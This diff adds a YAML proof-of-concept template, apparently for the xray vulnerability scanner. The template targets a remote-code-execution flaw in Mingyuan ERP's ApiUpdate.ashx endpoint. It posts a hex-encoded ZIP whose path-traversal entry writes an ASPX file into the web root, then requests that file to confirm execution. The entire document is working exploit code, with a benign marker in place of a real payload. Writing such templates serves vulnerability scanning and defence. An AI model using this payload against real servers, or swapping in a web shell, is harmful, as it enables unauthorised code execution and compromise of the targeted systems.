@@ -1,0 +1,19 @@
+name: poc-yaml-mingyuan_erp-apiupdate.ashx-rce
+transport: http
+set:
+  hexs: hexDecode("504b03041400000008002875b75603ad96c03d0000003d0000001c0000002e2e2f2e2e2f2e2e2f72616e646f6d5f746573745f30312e61737078b351755008484c4f55f049cc4b2f05326c959c959554edb86c541582528b0bf2f38a53f5c28b324b5235948a12f352f273154a528b4b9434ad1554ed00504b010214031400000008002875b75603ad96c03d0000003d0000001c00000000000000000000008001000000002e2e2f2e2e2f2e2e2f72616e646f6d5f746573745f30312e61737078504b050600000000010001004a000000770000000000")
+rules:
+  r0:
+    request:
+      method: POST
+      path: /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a
+      body: '{{hexs}}'
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /random_test_01.aspx
+    expression: response.body_string == 'random test'
+expression: r0() && r1()
+detail:
+  author: chaitin
